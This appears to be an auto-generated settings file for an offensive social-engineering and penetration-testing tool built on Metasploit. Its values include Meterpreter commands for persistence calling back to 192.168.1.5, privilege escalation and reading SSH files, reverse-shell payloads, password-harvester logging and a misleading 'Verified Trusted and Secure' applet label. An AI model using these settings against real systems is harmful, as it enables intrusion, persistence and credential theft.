#!/usr/bin/python3

#######################################################################
##                    DO NOT MODIFY THIS FILE                        ##
#######################################################################
#  This file is generated by a routine inside APTT, for use by APTT.    #
#                                                                     #
#  Settings should be modified in the set.config file, and then       #
#  APTT updated using the 'Update APTT Configuration' menu item in      #
#  the main menu. This file will be updated with the new settings.    #
#                                                                     #
#  set.config.py generated: 2024-04-24 19:29:01.019062                     #
#                                                                     #
#######################################################################
CONFIG_DATE='2024-04-24 19:29:01.019062'
METASPLOIT_PATH="/usr/share/metasploit-framework"
METASPLOIT_DATABASE="postgresql"
ENCOUNT=4
AUTO_MIGRATE=False
METERPRETER_MULTI_SCRIPT=False
LINUX_METERPRETER_MULTI_SCRIPT=False
METERPRETER_MULTI_COMMANDS="run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem"
LINUX_METERPRETER_MULTI_COMMANDS="uname;id;cat ~/.ssh/known_hosts"
METASPLOIT_IFRAME_PORT=8080
ETTERCAP=False
ETTERCAP_PATH="/usr/share/ettercap"
ETTERCAP_INTERFACE="eth0"
DSNIFF=False
AUTO_DETECT=False
SENDMAIL=False
EMAIL_PROVIDER="GMAIL"
WEBATTACK_EMAIL=False
TIME_DELAY_EMAIL="1"
APACHE_SERVER=False
APACHE_DIRECTORY="/var/www/html"
WEB_PORT=80
JAVA_ID_PARAM="Verified Trusted and Secure (VERIFIED)"
JAVA_REPEATER=False
JAVA_TIME="200"
WEBATTACK_SSL=False
SELF_SIGNED_CERT=False
PEM_CLIENT="/root/newcert.pem"
PEM_SERVER="/root/newreq.pem"
WEBJACKING_TIME=2000
SET_INTERACTIVE_SHELL="True"
UPX_ENCODE=False
UPX_PATH="/usr/bin/upx"
STAGE_ENCODING=False
AUTO_REDIRECT=True
HARVESTER_REDIRECT=False
HARVESTER_URL="http://thisisasite"
HARVESTER_LOG="/var/www"
HARVESTER_LOG_PASSWORDS="True"
UNC_EMBED=False
ACCESS_POINT_SSID="linksys"
AIRBASE_NG_PATH="/usr/sbin/airbase-ng"
DNSSPOOF_PATH="/usr/sbin/dnsspoof"
AP_CHANNEL=9
POWERSHELL_INJECTION=True
POWERSHELL_INJECT_PAYLOAD_X86="windows/meterpreter/reverse_https"
POWERSHELL_MULTI_INJECTION="True"
POWERSHELL_MULTI_PORTS="21,22,25,53,443"
POWERSHELL_VERBOSE=False
WEB_PROFILER=False
DEPLOY_OSX_LINUX_PAYLOADS="False"
OSX_REVERSE_PORT=8080
LINUX_REVERSE_PORT=8081
OSX_PAYLOAD_DELIVERY="osx/x86/shell_reverse_tcp"
LINUX_PAYLOAD_DELIVERY="linux/x86/meterpreter/reverse_tcp"
CUSTOM_LINUX_OSX_PAYLOAD="False"
ENABLE_PERSISTENCE_OSX="False"
USER_AGENT_STRING="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
SET_SHELL_STAGER="False"
AUTOMATIC_LISTENER=True
METASPLOIT_MODE=True
DEPLOY_BINARIES="NO"
CLEANUP_ENABLED_DEBUG="False"
TRACK_EMAIL_ADDRESSES=False
DNS_SERVER="False"
BLEEDING_EDGE="False"
WGET_DEEP="False"
